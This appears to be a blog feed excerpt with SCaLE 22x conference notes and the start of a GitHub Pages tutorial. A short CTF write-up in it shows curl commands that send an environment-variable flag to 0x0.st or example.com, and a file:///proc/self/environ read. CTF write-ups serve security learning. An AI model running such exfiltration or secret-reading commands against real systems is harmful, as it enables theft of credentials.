<p>Advice:</p>
<ul>
<li>Build on top of boring tools. Don’t waste your “innovation budget”.
<ul>
<li>E.g. Postgres. Object storage. Wireguard in userspace.</li>
</ul></li>
<li>Treat it like a database.</li>
<li>Scale things down when not in use, in order to save money.</li>
<li>Cheat by putting your model weights directly into the docker image.
<ul>
<li>If the image contains the weights, many platforms won’t charge you for the pull time</li>
</ul></li>
<li>Wireguard can be ran in userspace, which is useful for joining machines to eachothers network.</li>
</ul>
<p>Xe started wanting to self host everything, but reality got in the way.</p>
<p>Example Project, Mimi, an AI chatbot that gets images from discord:</p>
<ul>
<li>Used to be entirely self hosted across 3 nodes
<ul>
<li>Homelab server has 12 GB of vram</li>
</ul></li>
<li>Meta releases llama3, which requires 48 GB of vram.</li>
<li>But now runs on a cloud architecture
<ul>
<li>5 dollars (canadia money?) per month for Mimi’s cloud features</li>
</ul></li>
<li>Filter model still runs on self hosted.</li>
</ul>
<p>“It’s okay to use the cloud, just have an exit strategy”</p>
<p><a href="https://opensource.org/ai/open-weights" class="uri">https://opensource.org/ai/open-weights</a></p>
<p><a href="https://fal.ai/" class="uri">https://fal.ai/</a> — Flux image generator as a service, where you pay per image. Much cheaper than running Flux locally, but is not a locked in setup.</p>
<p>Every input matters:</p>
<ul>
<li>Claude gets lazy around august, Chatgpt gets really bad around december. Dates of chat have an effect on the LLM output.</li>
<li>The seed value can be set so that it’s deterministic
<ul>
<li>“seed 3407 is all your need”</li>
</ul></li>
<li>Set the temperature (randomness of output) as low as possible when trying to do something deterministic.</li>
<li>If an app doesn’t need an input, don’t give it to an LLM.</li>
</ul>
<p>Filter models:</p>
<ul>
<li>Sits in the middle of the AI flow, and checks the user input to ensure it is safe.</li>
<li>Also can sanitize</li>
<li>Prevents<br>
</li>
<li>Two most popular are: llamaguard (Xe stated llamaguard3-8b is good despite being small, because it is finetuned) from facebook, and shieldguard from google.</li>
<li>One time Mimi decided that <em>everything</em> was “Election Interference”</li>
</ul>
<p><a href="https://openrouter.ai/" class="uri">https://openrouter.ai/</a></p>
<p>Quantization: lossy compression to make the AI models smaller. The loss is minimal, but neglible.</p>
<p>Relevant Blogpost: <a href="https://www.tigrisdata.com/blog/ai-chatbot-friends/" class="uri">https://www.tigrisdata.com/blog/ai-chatbot-friends/</a></p>
</section>
</section>
<section id="open-source-career-day" class="level1">
<h1>Open Source Career Day</h1>
<section id="using-certification-to-prove-home-lab-skills" class="level2">
<h2 class="anchored" data-anchor-id="using-certification-to-prove-home-lab-skills">Using Certification to Prove Home Lab Skills</h2>
<p><a href="https://www.socallinuxexpo.org/scale/22x/presentations/using-certification-prove-home-lab-skills" class="uri">https://www.socallinuxexpo.org/scale/22x/presentations/using-certification-prove-home-lab-skills</a></p>
<p>Certificate vs Professional Certification:</p>
<ul>
<li>Certificate is just course + test
<ul>
<li>Graduate schools, MOOC’s, product academies</li>
<li>Indicates completion</li>
<li>May be from low stakes quizzes and training</li>
<li>Some of them are fantastic! Like Coursera’s CS50. But many are just trash, since they only require video + quiz.</li>
<li>Sometimes certificates are masked as certifications, even by a companies. Some certificates are just a piece of paper proving that you have a product. Sometimes they try to make <em>you</em> the product.</li>
</ul></li>
<li>Certification
<ul>
<li>Proves a level of competency</li>
<li>High stakes quizzes. Things like final exams of schools, a lengthy, proctored exam.
<ul>
<li>Presenter thinks proctoring is a problem, and is not enjoyable to do.</li>
<li>High stakes is challenging and difficult to do.</li>
</ul></li>
<li>The second assumes you know what you are doing when you show up.</li>
<li>By industry leaders or nonprofits. E.g: Linux foundation. Nonprofits are more credible and vendor neutral.</li>
<li>How to tell it’s actually a certification:
<ul>
<li>Do they publicize their methodology? How did they decide this is what to teach and test?</li>
<li>Because their are many ways to do things, certifications exams will actually make sure they account for every method possible to solve the problem. Simply expecting a specific command can exclude experts who do things a different way.</li>
<li>Industry leaders who make their own technologies will have an understanding of what is needed. Household names, rather than everybody who has a product</li>
</ul></li>
</ul></li>
</ul>
<p>Presenter’s analysis of Certifications:</p>
<ul>
<li>Performance based or Multiple course question (MCQ)? MCQ can be good, but…</li>
<li>How were they made? Subject matter expert involvement? Occupational focus?</li>
<li>High stakes vs low stakes? (Proctoring? Coverage?)</li>
<li>Do they keep up with industry changes?
<ul>
<li>One exam the presenter did hadn’t changed in 15 years…</li>
<li>Good exams require renewals every few years, or continuing education.</li>
<li>But make sure that the content is updated, rather than a subscription to keep the certificate…</li>
</ul></li>
<li>Community and industry reception?
<ul>
<li>Comptia: Historically nonprofit, but recently gone private.</li>
<li>Reddit, etc may be opinonated and like</li>
<li>Sometimes the recruiting department has only heard of one cert, but the hiring manager might have heard of more.</li>
<li>“That was boring” vs “That was kinda fun!”</li>
</ul></li>
<li>Look at prep materials to make sure stuff is good.
<ul>
<li>Harder, more realistic questions are better.</li>
</ul></li>
<li>If it’s a product based focus, then potentially, <em>you</em> are the product
<ul>
<li>“Wanna be a Joe No Name’s Database expert? Occupation? Idk, Data?”</li>
</ul></li>
</ul>
<p>Presenter:</p>
<ul>
<li>Ran a yoga studio… and her own DNS and webserver</li>
<li>Doing this since 1990s</li>
<li>Has a comparative literature degree, so she must prove that she is technically skilled
<ul>
<li>Says that a bachelors is not always needed.</li>
<li>Canonical asks about high school GPA… this is very controversial.</li>
</ul></li>
</ul>
<p>Job searching:</p>
<ul>
<li>You must know what the</li>
<li>“I just see a smattering of skills which may or may not be related”</li>
<li>“Job Skills Validation”, and “Job Task Analysis” (JTA)
<ul>
<li>JTA = Job Task Inventory, and a cert</li>
<li>Different companies mean different things when they mention a role</li>
</ul></li>
<li>If you want “Devops”, don’t apply to every singel job
<ul>
<li>Select a target, a “dream job”, and then cross reference the skillsets</li>
<li>“Criticality”: Importance, Frequency, then questions get asked about various skills</li>
<li>How many jobs want a specific tool, or just “something”. E.g: I just want playbooks, or SDLC, or CI/CD, or etc.</li>
</ul></li>
<li>Advanced level occupations are frequently less technical. Skills like management, communication, leadership, getting things done when no one else is, are unique.</li>
</ul>
<p>Q and A:</p>
<ul>
<li>One commenter suggests looking at Georgia Tech’s masters program, very cheap and Georgia tech is prestigious
<ul>
<li>Up and coming opportunity is revitalizing tech for the federal government…</li>
</ul></li>
<li>How to I pick stuff that lasts the test of time (that are relevant to the industry?):
<ul>
<li>“I reject the question”</li>
<li>You don’t. Software change.</li>
<li>Conceptual understanding and transfer, but presenter says that it was dumb luck</li>
<li>You might be an expert was something that ceased to exist 5 years ago, but on the other end, cobol programmers are still needed.</li>
</ul></li>
<li>How can AI help/ AI certs?
<ul>
<li>Most of the AI certs are product driven</li>
<li>Cloud providers have interesting certs, make sure it’s occupation focused stuff</li>
</ul></li>
<li>Book recommendation, by someone named Martin Yate.
<ul>
<li>Start with the <a href="https://www.amazon.com/Knock-Dead-Ultimate-Search-Guide/dp/150720535X">resume book</a></li>
</ul></li>
<li>One person suggests that we are going about to do</li>
<li>Any specific cert recommendations:
<ul>
<li>Depends on your industry:</li>
<li>With cloud it gets tricky, because you have to “declare industry” to one cloud provider or another.</li>
<li>Target job practice Pick what you want in advancetarget, and then go in that direction.</li>
<li>Skils that I can market and then I can do ajob in.</li>
<li>Devops has some very good online trainings, MOOCS are sometimes varied`</li>
<li>Comptia varies in quality</li>
</ul></li>
</ul>
<p>Presenter suggests that we subscribed to a number of sources that inform her on where the industry is and is going.</p>
<p>After presentation notes:</p>
<ul>
<li>Canonical ubuntu essentials cert, covers ubuntu basics. They don’t have microcloud/microk8s/sunbeam certs yet but plan to in 2027
<ul>
<li>This potentially sets up a career path working with Ubuntu, similar to the way Red Hat has certificates for working with all Red Hat software, in addition to Red Hat Enterprise Linux</li>
</ul></li>
<li>“You only need 1 job” apply to fewer jobs rather than more</li>
<li>security jobs: memorize owasp 10, do the b-side ctf and put on resume.</li>
<li>Comptia A+ is not worth anything, sec+ does have some value though</li>
<li>Focus on the skill. Why does the person you are talking to care?
<ul>
<li>“You’re not telling someone what you can do, you’re selling someone what you can do for them”</li>
</ul></li>
<li>Search jobs and check what’s hot to keep up with the landscape</li>
<li>Job titles to look into: cloud afmin, cloud architecture</li>
<li>Health or fintech are always behind. Startups are always using future software</li>
</ul>
</section>
</section>
<section id="scale-next-generation" class="level1">
<h1>Scale Next Generation</h1>
<p>They had a great deal of stuff set up for the next generation of Linux users, middle and high schoolers. I thought it was really cool, and since I like teaching, one of the organizers suggested that I hit them up and volunteer</p>
<p>They had multiple machines with the microbits, $20 little pi-like devices that can run python, for teaching python programming.</p>
<p><img src="./blog/scale-22/images/microbitnextgen.jpg" class="img-fluid"></p>
<p>They also had an array of books on Linux and software things:</p>
<p><img src="./blog/scale-22/images/nextgenbooks.jpg" class="img-fluid"></p>
<p>It was pretty neat.</p>
</section>
<section id="misc-notes-from-people-i-meet" class="level1">
<h1>Misc Notes from people I meet</h1>
<p>This is going to be a very unorganized section, containing a variety of little snippets from people I meet.</p>
<p>Nix can become nigthmarish to update on Mac OS, due to the system level changes that Mac makes: <a href="https://zenn.dev/kawarimidoll/scraps/3d71b16d1bb7e3" class="uri">https://zenn.dev/kawarimidoll/scraps/3d71b16d1bb7e3</a>.</p>
<p>Best large language model for coding: qwen2.5-32b-instruct. “On par with gpt-02-mini”.</p>
<p>A backend developer would be expected to deploy things and debug containers in kubernetes, or at least understand how their application will run in a k8s environment. Don’t have to be experts. For backend, frontend, not really.</p>
<p><a href="https://mailu.io/2024.06/">mailu</a> helm/docker based email deployment.</p>
<p>To get an ASN, you can simply create a company and then apply for it, but the organization responsible for giving them out has ran out of them.</p>
<p>Apparently, infinite recursion can occur as an error in Nix.</p>
<p>CubeFS is a good alternative to ceph or longhorn for a Kubernetes distribution filesystem.</p>
<p>Github class is good for teaching with an environment, but it is getting more bugs and is collapsing.</p>
<p>National Science Foundation, has Research Experiences for Undergraduates (REU). According to someone, they also offer money for various other research initiatives.</p>
<p>Jean Kims book, phoenix project. Recommended to me when I talked about DevOps philosophy.</p>
<p>Ditherit.com</p>
<p>https://www.recurse.com</p>
<p>Take a break during jobs</p>
<p>Linbit, open source block storage</p>
<p>Hackathons sometimes involve shark tank style pitches.</p>
<p>ID tech teaching platform</p>
<p>Georgia Tech Research Institute is always hiring.</p>
<p>Oracle Linux has a one/two click VM that runs: <a href="https://xeiaso.net/notes/2025/k8s-dev-mac-oracle-linux/" class="uri">https://xeiaso.net/notes/2025/k8s-dev-mac-oracle-linux/</a></p>
<p>Onepassword has a nice kubernetes operator.</p>
<p>Git forges are especially vulnerable to AI scrapers, since they have so many links and commit history saved. Xe Iaso’s proof of work captcha led to a 90% reduction on Gnome’s gitlab. If you return http 200 and at least 4 kilobytes of html, scrapers will give up. <a href="https://xeiaso.net/blog/2025/anubis/" class="uri">https://xeiaso.net/blog/2025/anubis/</a></p>
<p>Open Compute project.</p>
<p><a href="https://en.wikipedia.org/wiki/TLA%2B" class="uri">https://en.wikipedia.org/wiki/TLA%2B</a></p>
<p><a href="https://stardustxr.org" class="uri">https://stardustxr.org</a> creator reccs quest 3 becuase hand tracking and stuff</p>
<p>Alyx lynd feline learn to solder board</p>
<p>Nixos containers are the same thing, or very similar to solaris zones.</p>
<p><a href="https://github.com/MrMEEE/bumblebee-Old-and-abbandoned/issues/123" class="uri">https://github.com/MrMEEE/bumblebee-Old-and-abbandoned/issues/123</a> — Lmao.</p>
<p>To lean linux kernel networking, listen to good talks or on youtube.</p>
<p>Software’s for networking testing and engineering: Packettracer, eve ng alternative, gns3 latter two are emukated, cisco packet tracer is a “simulator”.</p>
<p>b4 to automate kernel mailing list tasks.</p>
<p>Flyaway kit https://www.kranzetech.com/di-fak/ . “May or may not be used for mobile threat hunting”</p>
<p>Rocky mountain cyber, conference full of industry experts.</p>
<p>Liquid, by makers of pci, allows for composable pci architecture</p>
<p>Ampere yolo for computer vision</p>
</section>
<section id="job-board" class="level1">
<h1>Job Board</h1>
<p>There is a literal job baord at SCaLE, a literal whiteboard where companies mention they are hiring or people state that they are looking for a job.</p>
<p><img src="./blog/scale-22/images/jobboard1.jpg" class="img-fluid"></p>
<p><img src="./blog/scale-22/images/jobboard2.jpg" class="img-fluid"></p>
<p><img src="./blog/scale-22/images/jobboard3.jpg" class="img-fluid"></p>
<p><img src="./blog/scale-22/images/jobboard4.jpg" class="img-fluid"></p>
<p>Someone also transcribed it to a <a href="https://docs.google.com/spreadsheets/d/1vhISsHTQZBTtaCWB1iNbM0ScBfp8fTTu4vNM7AxC72s/htmlview#gid=0">google sheets</a>.</p>
<p>They also put the job board on <a href="https://imgur.com/a/scale-job-boards-E0HgRZV">imgur</a>.</p>
</section>
<section id="exhibition-hall" class="level1">
<h1>Exhibition Hall</h1>
<p>There was some fun stuff in the exhibition hall.</p>
<p>There was a bunch of this new Arm system76 desktop, which they displayed at their booth:</p>
<p><img src="./blog/scale-22/images/system76.jpg" class="img-fluid"></p>
<p>But it was also at the Arm booth:</p>
<p><img src="./blog/scale-22/images/armbooth.jpg" class="img-fluid"></p>
<p>And the Nixos booth (they were using it as a build server/cache on Thursday/Friday in the other conference building and today)</p>
<p><img src="./blog/scale-22/images/nixosampere.jpg" class="img-fluid"></p>
<p>And the Alma Linux booth also had one of these devices:</p>
<p><img src="./blog/scale-22/images/almaampere.jpg" class="img-fluid"></p>
<p>I learned at that booth that apparently, Ovirt is being built and tested against Alma Linux now.</p>
<p>There was other Arm stuff, like this Mac Mini running Arm and Asahi Linux, where they were installing games from steam during the exhibition hall. This was from the Meta/Facebook table.</p>
<p><img src="./blog/scale-22/images/macminiarm.jpg" class="img-fluid"></p>
<p>I learned at the Sofware Freedomm Conservancy booth that they sponsored the event, and all of the routers in the event run the fully free software openwrt operating system.</p>
<p><img src="./blog/scale-22/images/router1.jpg" class="img-fluid"></p>
<p><img src="./blog/scale-22/images/router2.jpg" class="img-fluid"></p>
<p>WRCCDC had a booth as well:</p>
<p><img src="./blog/scale-22/images/wrccdc.jpg" class="img-fluid"></p>
<p>A really interesting booth was the Mentors in Tech (MINT) booth.</p>
<p><img src="./blog/scale-22/images/mentorsintech.jpg" class="img-fluid"></p>
<p>They run a mentorship program for students, designed for getting them into the industry.</p>
<p>Meetups I just learned about (Or haven’t gone to yet):</p>
<ul>
<li>Datacon LA, a 1 day conference in la</li>
<li><a href="https://issasocal.org" class="uri">https://issasocal.org</a>
<ul>
<li>Information systems security association</li>
<li>Semi-regular meetups in LA</li>
</ul></li>
<li>Owasp
<ul>
<li>Last wednesday of every month</li>
<li>Can RSVP on Linkedin</li>
</ul></li>
<li>Information technology disaster resource center
<ul>
<li>They volunteer to set up IT infrastructure in disaster areas that need it</li>
<li><a href="https://www.itdrc.org/" class="uri">https://www.itdrc.org/</a></li>
<li>Require some trainings, and offer some free trainings on what is needed to do the job</li>
</ul></li>
</ul>
<p>Interesting software/products/stuff:</p>
<ul>
<li><a href="https://coder.com" class="uri">https://coder.com</a>
<ul>
<li>Self hosted deployment of online code workspaces</li>
<li>They also seem to offer kasmvnc or rdp, in addition to vscode web version</li>
</ul></li>
<li>FastX
<ul>
<li>Virtual Desktop Infrastructure offering Linux machines</li>
<li>educational licenses are cheaper, apparently all of cal state had a license</li>
</ul></li>
<li>&lt;lpi.org/clubs&gt; — The Linux professional Institute has notes on
<ul>
<li>Ieee acm curriculum for bachelors in computer science or comp engineering, but don’t say what software or hardware, so you can pick</li>
</ul></li>
<li><a href="https://www.codeday.org/" class="uri">https://www.codeday.org/</a>
<ul>
<li>Computing talent initiative, sign people up for this</li>
</ul></li>
</ul>
</section>
<section id="ctf" class="level1">
<h1>CTF</h1>
<p>The CTF is the Pacific Hackers CTF. I might to a mini writeup here.</p>
<p>First, I try artist, the webdev program. It’s url is at <a href="https://artist.ctf.pacifichackers.com" class="uri">https://artist.ctf.pacifichackers.com</a> I downloaded the source code they provided and saw this in the fake dockerfile:</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode Dockerfile code-with-copy"><code class="sourceCode dockerfile"><span id="cb1-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">ENV</span> FLAG=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"FAKE_FLAG{FOR_TESTING}"</span></span></code></pre></div>
<p>The code doesn’t have the real flag. But based on this, I am guessing that the real flag is an environment variable injected into the docker container from however they are running it.</p>
<p>In the flask code, it runs curl to get the background:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb2-1"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">try</span>:</span>
<span id="cb2-2">    result <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> subprocess.run(</span>
<span id="cb2-3">        [<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'curl'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-s'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-L'</span>, background],</span>
<span id="cb2-4">        capture_output<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">True</span>,</span>
<span id="cb2-5">        shell<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">False</span></span>
<span id="cb2-6">    )</span></code></pre></div>
<p>This is ultra sus. Also, I feel like setting the background of a simple drawing app shouldn’t require or interact with the backdend.</p>
<p>We need to make a command that uploads or publishes the environment variable. However, <code>shell=False</code> means we can’t use “&amp;&amp;” or any bash-isms to get more commands.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">[moonpie@osiris ~]$ curl -sL -F</span>
<span id="cb3-2">curl: option -F: requires parameter</span>
<span id="cb3-3">curl: try 'curl --help' for more information</span></code></pre></div>
<p>Interesing. We can do -F, which uploads along with the thing.</p>
<p>So if we do something like this: <code>-F "file=@-" https://0x0.st &lt;&lt;&lt; "$FLAG"</code> and then it should upload our flag to 0x0.st.</p>
<p>Pastebin. Doesn’t seem to work. I threw up my own http server on my server. Maybe something like this? :</p>
<pre><code>curl -d "key1=value1&amp;key2=${ENV_VARIABLE}" http://example.com</code></pre>
<p>This fails since python http server doesn’t accept post. So I have gpt throw together something that does:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb5-1"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">from</span> http.server <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> HTTPServer, BaseHTTPRequestHandler</span>
<span id="cb5-2"></span>
<span id="cb5-3"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">class</span> SimpleHTTPRequestHandler(BaseHTTPRequestHandler):</span>
<span id="cb5-4">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> do_POST(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb5-5">        content_length <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">int</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.headers[<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Content-Length'</span>])</span>
<span id="cb5-6">        post_data <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.rfile.read(content_length).decode(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'utf-8'</span>)</span>
<span id="cb5-7">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">f"Received data: </span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span>post_data<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span>)</span>
<span id="cb5-8">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.send_response(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">200</span>)</span>
<span id="cb5-9">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.end_headers()</span>
<span id="cb5-10">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.wfile.write(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b"Data received successfully"</span>)</span>
<span id="cb5-11"></span>
<span id="cb5-12">httpd <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> HTTPServer((<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8000</span>), SimpleHTTPRequestHandler)</span>
<span id="cb5-13"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Server running on http://localhost:8000"</span>)</span>
<span id="cb5-14">httpd.serve_forever()</span></code></pre></div>
<p>And then I run this. <code>curl -X POST -d "Hello, server!" http://localhost:8000</code> to send stuff.</p>
<p>I still can’t exploit the flask logic, however. Also, I don’t know how to do a shell variable replacement from here. I think this is too complex. It seems that the logic returns a base64 encoded version of whatever the output is, so I’ll just attempt to get curl to print the environment variable.</p>
<p><code>curl -w "Username: $TEST\n" http://example.com</code></p>
<p>Whoops, there is an easier way to do this, given to me by a friend:</p>
<p><code>file:///proc/self/environ</code></p>
<p>Just have that as the parameter, and then it outputs a base64 of all of the envirnoment variables.</p>
<p>According to a friend, it’s not possible to inject flags the way that they have used the python subprocess module, since they have each flag as a comma seperated arguement. However, he did claim it is possible in other, less secure setups.</p>
<p>There is also a really interesting set of challenges, the <a href="https://pacifichackers.com/challenges#Level%201">bashcrawl challenges</a>, which are used to teach linux.</p>
<ul>
<li><a href="https://github.com/mks22-dw/bashcrawl" class="uri">https://github.com/mks22-dw/bashcrawl</a></li>
<li><a href="https://mybinder.org/v2/gl/nthiery%2Fbashcrawl/HEAD" class="uri">https://mybinder.org/v2/gl/nthiery%2Fbashcrawl/HEAD</a></li>
</ul>
</section>
<section id="loot" class="level1">
<h1>Loot!</h1>
<p>I got a lot. There are so many exhibitors here giving things out, so I made sure to take advantage.</p>
<p>I will do a detailed sorting and breakdown of what I got later.</p>
<p>So here is the breakdown. Firstly, are the things I bought.</p>
<p><img src="./blog/scale-22/images/loot0.jpg" class="img-fluid"></p>
<p>From the Debian booth, I bought two small SBC’s. And then from the Nixos booth I bought a cool necklace.</p>
<p>Then I went to many of the booths, and got so much cool stuff. From <a href="https://www.rackspace.com/">rackspace</a> I got a nice boogie baord. And then from <a href="https://coder.com/">coder</a> I got a hand skateboard and a fidget cube.</p>
<p>Flox gave everybody 3d printed fidget keycap cases to press. WRCCDC/Coastline college gave people</p>
<p>And then the foldable fidget cube on the left, is from <a href="https://www.purestorage.com/">PureStorage</a></p>
<p><img src="./blog/scale-22/images/loot1.jpg" class="img-fluid"></p>
<p><img src="./blog/scale-22/images/mousepad.jpg" class="img-fluid"></p>
<p>I also managed to get a mousepad from CodeDay/Mentors in Tech.</p>
<p><img src="./blog/scale-22/images/coloringbooks.jpg" class="img-fluid"></p>
<p>And of course, physical versions of the <a href="https://developers.redhat.com/e-books/selinux-coloring-book">SELinux coling book</a> and the <a href="https://developers.redhat.com/e-books/container-commandos-coloring-book">Container Commandos</a> coloring book. I’ve seen the former on the internet before, but not the latter, but it seems to be cool, and goes over Red Hat’s OCI products.</p>
<p><img src="./blog/scale-22/images/loot2.jpg" class="img-fluid"></p>
<p>I got mugs from Arm and Fedora. I think that Mugs weren’t something they were universally giving out, I think you had to be liked by the people working the booths.</p>
<p><img src="./blog/scale-22/images/loot3.jpg" class="img-fluid"></p>
<p>I also got a guitar pick, from the Network Time Foundation. According to them, the guitar pick is custom made, and happens to be the perfect size for shucking hard disks without damaging the disk.</p>
</section>
<section id="food-blog" class="level1">
<h1>Food Blog</h1>
<p>People keep telling me I should start one. So here’s a mini food blog.</p>
<p>Day 1:s</p>
<p>So the first day, the first place I went to, for lunch, was <a href="https://www.facebook.com/artlunchusa">Art Lunch</a></p>
<p>I had the Pastrami Sandwich</p>
<p><img src="./blog/scale-22/images/art_lunch.jpg" class="img-fluid"></p>
<p>It was very good, and filling, too. At $14, it was a bit pricy though.</p>
<p>The next place I went to, dinner (Thursday 3/6/25), was an Italian place, Bucca di Bepppo.</p>
<p>This place was a family restaurant, so all the portions were sized for multiple people. I shared Lasagna, Chicken Parmesan, garlic sticks, and Gorgonzola salad with 11 other people.</p>
<p>Overall, it was excellent.</p>
<p>Day 2:</p>
<p>For breakfast, it was again a cream cheese bagel and an apple danish.</p>
<p>For lunch, the Pasadena Convention center provided food as part of the DevopsDay LA open spaces. It was pretty good too, and it was free.</p>
<p><img src="./blog/scale-22/images/turkeysandwich.jpg" class="img-fluid"></p>
<p>I also got some of Tony’s dark chocolate from the Arm booth:</p>
<p><img src="./blog/scale-22/images/darkchocolate.jpg" class="img-fluid"></p>
<p>It was pretty good, 70% dark. It was hard to break pieces off so I could eat or share them though. I only ate half off it, and threw the rest away, it was a really big bar and I couldn’t eat all of it.</p>
<p>For dinner I had an extra one of the sandwiches mentioned above, which a friend had given to me and I saved it so I could eat it later.</p>
<p>Day 3:</p>
<p>For lunch, I went to the food place they had in the exhibition hall. I had a chicken sandwich, and fries, and it was actually pretty good. Here’s a picture:</p>
<p><img src="./blog/scale-22/images/chickensandwich.jpg" class="img-fluid"></p>
<p>For dinner, I went to El Cholo. I also forgot to take a picture, but I talked a ton with the Nix people. It was also pretty good.</p>
<p>Day 4:</p>
<p>For lunch, I had the same chicken sandwich I had yesterday. For dinner, I had sweet and sour chicken at Gmo’s, the Cal State Northridge campus eatery.</p>


</section>

 ]]></description>
  <category>blog</category>
  <guid>./blog/scale-22/</guid>
  <pubDate>Mon, 10 Mar 2025 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Your very own site on GitHub Pages</title>
  <link>./talks/self-site/</link>
  <description><![CDATA[ 




<p>For the Layer8 Cybersecurity club here at Cal State Northridge, and potentially more clubs, I will do a presentation on how I set up my site with Github pages, and how to set up your own site the same way.</p>
<p>This guide uses Github Actions to autodeploy, so all users need to do is commit from the web interface of Github, their site will automatically render changes.</p>
<p>Below is the same presentation, rendered to html with the slide titles as headers.</p>
<p>If you want to see the presentation in slides form, click the “RevealJS” format on the right, under “Other formats”.</p>
<p>Here is a qr code to the slides:</p>
<div id="qrcode" class="qrcode"></div>
<script type="text/javascript">
var qrcode = new QRCode("qrcode", {"colorDark":"#000000","colorLight":"#ffffff","height":128,"text":"https://moonpidumplings.github.io/self-site","width":128});
</script>
    
<p><br></p>
<section id="about-me-and-my-site" class="level2">
<h2 class="anchored" data-anchor-id="about-me-and-my-site">About me and my site</h2>
<ul>
<li>Jeffrey Fonseca
<ul>
<li>Using linux for almost 6 years</li>
<li>Started blogging just last year</li>
</ul></li>
<li>Site: <a href="https://moonpiedumplings.github.io/">moonpiedumplings.github.io</a></li>
</ul>
</section>
<section id="benefits-of-a-site" class="level2">
<h2 class="anchored" data-anchor-id="benefits-of-a-site">Benefits of a site</h2>
<ul>
<li>Portfolio and resume</li>
<li>Notes on longer projects</li>
<li>Social Media — A few friends follow my blog</li>
</ul>
</section>
<section id="setup" class="level2">
<h2 class="anchored" data-anchor-id="setup">Setup</h2>
<ul>
<li>Go to <a href="https://github.com">github.com</a> and create an account
<ul>
<li>Your site will be located at “username.github.io”</li>
</ul></li>
<li>Go to <a href="https://github.com/moonpiedumplings/blog-template">github.com/moonpiedumplings/blog-template</a> and select “use template”
<ul>
<li>The repo name should be “username.github.io”</li>
<li>make sure to select “include all branches”</li>
<li>in the github settings, make sure “gh-pages” is selected as the deploy</li>
</ul></li>
</ul>
</section>
<section id="directory-structure" class="level2">
<h2 class="anchored" data-anchor-id="directory-structure">Directory Structure</h2>
<p>The files and folders are laid out simply.</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">.</span>
<span id="cb1-2">|-- _quarto.yml # Configuration for quarto</span>
<span id="cb1-3">|-- blog</span>
<span id="cb1-4">|   |-- index.md # Directory listing</span>
<span id="cb1-5">|   |-- markdown</span>
<span id="cb1-6">|   |   `-- index.md</span>
<span id="cb1-7">|   `-- quarto</span>
<span id="cb1-8">|       `-- index.md</span>
<span id="cb1-9">|-- index.md</span></code></pre></div>
</section>
<section id="directory-structure-cont." class="level2">
<h2 class="anchored" data-anchor-id="directory-structure-cont.">Directory Structure (cont.)</h2>
<ul>
<li>The “index.md” within of each folder is what gets rendered into a an html file, a browser page</li>
<li>The “index.md” in “blog” is a special format called a “listing”, rather than a normal article, it generates the list of articles, the filtering, etc on the “blog” page</li>
</ul>
</section>
<section id="markdown" class="level2">
<h2 class="anchored" data-anchor-id="markdown">Markdown</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> is <strong>markup language</strong></li>
<li>Enables users to render formatted documents from <strong>plaintext</strong></li>
<li>Most static site generators use markdown</li>
</ul>
</section>
<section id="markdown-code-snippets" class="level2">
<h2 class="anchored" data-anchor-id="markdown-code-snippets">Markdown Code Snippets</h2>
<p><br></p>
<pre><code>`this is code snippets`</code></pre>
<p><br></p>
<p>They result in unformated, monospace text:</p>
<p><br></p>
<p><code>this is code snippets</code></p>
</section>
<section id="markdown-basics" class="level2">
